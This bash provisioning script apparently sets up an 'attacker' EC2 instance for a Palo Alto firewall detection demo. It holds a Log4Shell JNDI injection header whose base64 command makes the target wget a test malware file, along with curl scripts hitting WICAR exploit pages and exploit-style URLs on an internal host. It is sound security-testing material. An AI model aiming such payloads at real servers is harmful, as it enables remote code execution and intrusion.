#!/bin/bash

exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1

# Update hostname for better identification
sudo hostname attacker

# Updating yum repositories
sudo yum update -y

# Installing Docker
sudo amazon-linux-extras install docker -y

# Set hostfile
sudo echo "10.1.1.100 mlav.testpanw.com" >> /etc/hosts

# Starting Docker
sudo service docker start
sudo systemctl enable docker
sudo usermod -a -G docker ec2-user
sudo docker info
mkdir /tmp/scripts

# Preparing the launch_attack script
ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
ATTACK_COMMAND="curl 10.1.1.100:8080 -H '${ATTACK_URL}'"
sudo echo "${ATTACK_COMMAND}" >> /tmp/scripts/launch_log4j_attack.sh

# Downloading and Running the Attack App Server Demo App
sudo docker container run -itd --rm --name att-svr -p 8888:8888 -p 1389:1389 us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-svr:1.0

cat << EOH > /tmp/scripts/launch_windows_executable.sh
echo -e "\nInline ML - Windows Executables Test File Detection...\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://wildfire.paloaltonetworks.com/publicapi/test/pe && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://wildfire.paloaltonetworks.com/publicapi/test/pe && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://wildfire.paloaltonetworks.com/publicapi/test/elf && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" https://secure.eicar.org/eicar.com.txt && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://urlfiltering.paloaltonetworks.com/test-malware && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://malware.wicar.org/data/js_crypto_miner.html && echo -e "\n"
EOH

cat << EOH > /tmp/scripts/launch_exploit.sh
curl -m 5 -s -o /dev/null -w "%{http_code}" http://malware.wicar.org/data/ms10_090_ie_css_clip_ie6.html && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://malware.wicar.org/data/firefox_proto_crmfrequest.html && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://10.1.1.100/mondragon/thumb.php?praquem=xhots && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://10.1.1.100/eula.cgi?BUILDNAME= && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://10.1.1.100/vscript/utils/ip2cc.psc && echo -e "\n"
EOH

cat << EOH > /tmp/scripts/launch_js_phishing.sh
echo -e "Inline ML - Javascript Exploit & Phishing Detection...\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://mlav.testpanw.com/js.html && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://mlav.testpanw.com/phishing.html && echo -e "\n"
curl -m 5 -s -o /dev/null -w "%{http_code}" http://urlfiltering.paloaltonetworks.com/test-phishing && echo -e "\n"
EOH

sudo chown -R ec2-user:ec2-user /tmp/scripts
sudo chmod +x /tmp/scripts/*

